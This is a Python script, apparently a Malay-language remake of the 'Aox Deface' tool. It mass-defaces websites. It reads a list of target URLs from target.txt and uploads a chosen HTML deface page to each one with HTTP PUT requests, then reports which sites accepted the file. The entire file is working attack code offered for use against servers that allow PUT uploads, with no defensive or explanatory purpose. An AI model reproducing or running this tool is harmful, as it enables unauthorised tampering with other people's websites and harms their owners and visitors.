#-*- coding: utf-8 -*-
#remake from Aox Deface
#Malay Language

#color preference

BLACK   = '\033[30m'
RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
MAGENTA = '\033[35m'
CYAN    = '\033[36m'
WHITE   = '\033[37m'
RESET   = '\033[39m'

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("pasang request dan cuba lagi !")
os.system("clear")
os.system("toilet -F border --metal -f mono12 WEBDEF")
print ("*Keluar dengan 'CTRL+Z' dan Edit File 'target.txt' dengan type 'nano target.txt' dan masukkan link target..")
contoh = """
contoh di dalam target.txt:
http://contoh.com
http://contoh1.com
http://contoh2.com
http://contoh3.co.za
http://contoh4.co.il 
"""
print (contoh)
banner = """
|-----------------------------|
 Author : Mika259
 Github : https://github.com/Mika259
|-----------------------------|
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(test):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(test)
   else:
      ipt = raw_input(test)

   return str(ipt)

def webdef(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("muat naik fail ke %d web"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" GAGAL!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" BERJAYA !"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("[+] Nama File Deface: ")
         if not os.path.isfile(a):
            print("fail '%s' tidak dijumpai, pastikan file html anda berada di dalam folder webdef ini"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   webdef(a)

if __name__ == "__main__":
    main(banner)
